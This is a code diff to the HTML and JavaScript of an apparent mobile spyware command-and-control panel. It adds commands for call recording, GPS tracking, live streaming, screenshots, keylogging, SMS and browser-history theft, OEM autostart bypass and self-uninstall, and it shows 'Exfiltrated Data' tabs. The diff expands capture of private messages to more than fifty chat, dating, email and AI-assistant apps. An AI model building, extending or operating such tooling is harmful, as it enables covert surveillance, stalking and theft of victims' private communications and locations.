@@ -36,7 +36,6 @@
         <a href="/">&#8592; Back to Dashboard</a>
     </div>
     <div class="content">
-
         <!-- ═══════════════ COMMAND PANEL ═══════════════ -->
         <div class="section-title">Send Command</div>
         <div class="cmd-form">
@@ -46,7 +45,7 @@
                     <option value="stop_location">Stop GPS Tracking</option>
                 </optgroup>
                 <optgroup label="Calls">
-                    <option value="start_call_record">Record Calls (VOICE_CALL source)</option>
+                    <option value="start_call_record">Record Calls (multi-source)</option>
                     <option value="stop_call_record">Stop Call Recording</option>
                 </optgroup>
                 <optgroup label="Audio">
@@ -60,25 +59,28 @@
                     <option value="start_livestream">Start Live Stream</option>
                     <option value="stop_livestream">Stop Live Stream</option>
                 </optgroup>
-                <optgroup label="Screen">
-                    <option value="take_screenshot">Screenshot</option>
-                </optgroup>
-                <optgroup label="Data Exfil">
+                <optgroup label="Sync Data">
                     <option value="sync_contacts">Sync Contacts</option>
                     <option value="sync_sms">Sync SMS</option>
-                    <option value="sync_appusage">Sync App Usage</option>
-                    <option value="sync_calendar">Sync Calendar Events</option>
+                    <option value="sync_call_logs">Sync Call Logs</option>
+                    <option value="sync_calendar">Sync Calendar</option>
                     <option value="sync_browser_history">Sync Browser History</option>
+                    <option value="sync_apps">Sync Installed Apps</option>
+                </optgroup>
+                <optgroup label="Screenshots">
+                    <option value="screenshot">Take Screenshot</option>
+                </optgroup>
+                <optgroup label="Keylogger">
                     <option value="flush_keylog">Flush Keylog Buffer</option>
                 </optgroup>
-                <optgroup label="System">
-                    <option value="get_device_info">Get Device Info</option>
-                    <option value="get_clipboard">Get Clipboard</option>
-                    <option value="list_files">List Files</option>
-                    <option value="vibrate">Vibrate Device</option>
-                    <option value="ring">Ring Device</option>
-                    <option value="lock_device">Lock Screen</option>
-                    <option value="hide_icon">Hide App Icon</option>
+                <optgroup label="Evasion">
+                    <option value="bypass_autostart">Bypass OEM Autostart</option>
+                    <option value="disable_battery_optimization">Disable Battery Optimization</option>
+                </optgroup>
+                <optgroup label="Device">
+                    <option value="reboot">Reboot Device</option>
+                    <option value="device_info">Get Device Info</option>
+                    <option value="uninstall">Uninstall Self</option>
                 </optgroup>
                 <optgroup label="Dangerous">
                     <option value="stop_all">Stop All</option>
@@ -88,7 +90,6 @@
             <input type="text" id="args" placeholder="Args (optional)" style="width:200px;">
             <button onclick="sendCmd()">Send</button>
         </div>
-
         <!-- ═══════════════ EXFIL DATA TABS ═══════════════ -->
         <div class="section-title">Exfiltrated Data</div>
         <div class="tabs">
@@ -97,7 +98,7 @@
             <div class="tab" onclick="switchTab('call', this)">Calls</div>
             <div class="tab" onclick="switchTab('location', this)">Location</div>
             <div class="tab" onclick="switchTab('contact', this)">Contacts</div>
-            <div class="tab" onclick="switchTab('im', this)">IM / Chat</div>
+            <div class="tab" onclick="switchTab('im', this)">IM / Chat (all apps)</div>
             <div class="tab" onclick="switchTab('keylog', this)">Keylog</div>
             <div class="tab" onclick="switchTab('calendar', this)">Calendar</div>
             <div class="tab" onclick="switchTab('browser', this)">Browser</div>
@@ -105,7 +106,6 @@
             <div class="tab" onclick="switchTab('app_usage', this)">App Usage</div>
             <div class="tab" onclick="switchTab('other', this)">Other</div>
         </div>
-
         <div id="exfil-table-container">
             <table id="exfil-table">
                 <thead><tr><th>Type</th><th>Time</th><th>Payload</th></tr></thead>
@@ -123,7 +123,6 @@
                 </tbody>
             </table>
         </div>
-
         <!-- ═══════════════ COMMAND HISTORY ═══════════════ -->
         <div class="section-title">Command History</div>
         <table>
@@ -143,7 +142,6 @@
             </tbody>
         </table>
     </div>
-
     <script>
         // ── Command sender ──
         async function sendCmd() {
@@ -156,14 +154,23 @@
             });
             location.reload();
         }
-
-        // ── Tab filtering ──
-        const IM_TYPES = ['im','im_whatsapp','im_telegram','im_instagram','im_facebook',
-                          'im_viber','im_skype','im_vk','im_gmail','im_deepseek','im_grok'];
+        // ── Tab filtering: ALL 50+ IM types ──
+        const IM_TYPES = [
+            'im','im_whatsapp','im_telegram','im_signal','im_instagram',
+            'im_facebook','im_viber','im_skype','im_vk','im_discord',
+            'im_line','im_kakaotalk','im_bbm','im_wechat','im_weibo',
+            'im_snapchat','im_tinder','im_tumblr','im_twitter','im_tiktok',
+            'im_reddit','im_textme','im_kik','im_threema','im_zalo',
+            'im_muzmatch','im_imo','im_wamba','im_waplog','im_boo',
+            'im_mamba','im_gostinder','im_okru','im_oneme','im_skylove',
+            'im_hangouts','im_gmail','im_outlook','im_bluemail','im_yandexmail',
+            'im_deepseek','im_chatgpt','im_grok','im_perplexity','im_scaleup',
+            'im_alice','im_teams','im_meet','im_googlechat'
+        ];
         const BROWSER_TYPES = ['browser_history','browser_url'];
         const OTHER_TYPES = ['screencap','camera','audio','device_info','files','clipboard',
-                             'battery','sim','network','livestream'];
-
+                             'battery','sim','network','livestream','screenshot',
+                             'calendar','keylog','app_usage','app_install','notification'];
         function switchTab(tab, el) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             el.classList.add('active');
